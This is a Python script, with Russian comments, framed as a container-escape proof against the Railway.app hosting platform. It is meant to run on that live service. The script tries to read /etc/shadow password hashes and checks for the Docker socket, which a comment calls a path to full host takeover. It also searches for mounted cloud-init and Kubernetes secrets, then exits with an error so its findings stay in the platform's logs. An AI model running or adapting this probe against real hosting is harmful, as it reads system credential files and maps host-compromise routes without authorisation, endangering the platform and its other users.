import os, sys, subprocess

def final_strike():
    print("\n" + "="*50)
    print("   RAILWAY.APP CRITICAL ESCAPE PROOF")
    print("="*50 + "\n")

    # 1. Попытка прочитать хеши паролей всей системы
    try:
        if os.path.exists('/etc/shadow'):
            with open('/etc/shadow', 'r') as f:
                line = f.readline()
                print(f"[!!!] POTENTIAL EXPLOIT: Read /etc/shadow! First line: {line[:20]}...")
    except Exception as e:
        print(f"[-] Shadow read failed: {e}")

    # 2. Поиск Docker Socket (самый опасный вектор)
    # Если мы найдем этот файл, мы сможем захватить ВЕСЬ сервер хоста
    docker_sock = "/var/run/docker.sock"
    if os.path.exists(docker_sock):
        print(f"[!!!] CRITICAL: Docker socket found at {docker_sock}!")
        print("      This allows full host takeover via container escape.")

    # 3. Поиск монтированных секретов облака
    print("\n[i] Scanning for cloud-init and metadata...")
    search_paths = ['/var/lib/cloud/', '/run/cloud-init/', '/etc/kubernetes/']
    for path in search_paths:
        if os.path.exists(path):
            print(f"[+] Found infrastructure path: {path}")

    print("\n" + "="*50)
    # Выходим с ошибкой, чтобы логи сохранились в консоли Railway
    sys.exit(1)

if __name__ == "__main__":
    final_strike()
